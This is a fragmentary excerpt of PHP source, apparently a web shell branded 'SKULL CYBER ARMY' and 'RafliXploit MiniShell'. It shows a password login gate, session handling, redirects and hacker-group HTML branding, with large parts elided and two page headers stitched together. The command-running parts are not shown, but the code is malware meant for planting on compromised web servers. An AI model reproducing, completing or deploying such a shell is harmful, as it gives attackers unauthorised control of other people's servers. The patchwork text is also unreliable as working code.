...
if($_POST['password'] == $pass) {
  ...
  echo "<script>window.location='?SKULL CYBER ARMY'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
...
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?./RafliXploit'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>Shell SKULL CYBER ARMY</title>
...
<body bgcolor="black">
	<center><img src="https://e.top4top.io/p_1983ffqsm0.png" style="opacity:0.5; width:650px; height:650px";></center>
	<center><h1><center><font color="red" face="Patrick Hand">-=[ SKULL CYBER ARMY</font><font color="white" face="Patrick Hand"> Shell ]=-</font><br>
</center>
...
<HTML>
<HEAD>
<link rel="SHORTCUT ICON" href="https://e.top4top.io/p_1983ffqsm0.png">
<DIV align=center><IMG src="https://e.top4top.io/p_1983ffqsm0.png" width=650 height=650><br>
...
<title>RafliXploit MiniShell</title>
...
echo '<font face="Kelly Slab" color="white" size="2px"><center><br/><b>Copyright &copy; 2020 <font color="lime">SKULL CYBER ARMY</a></center></font>
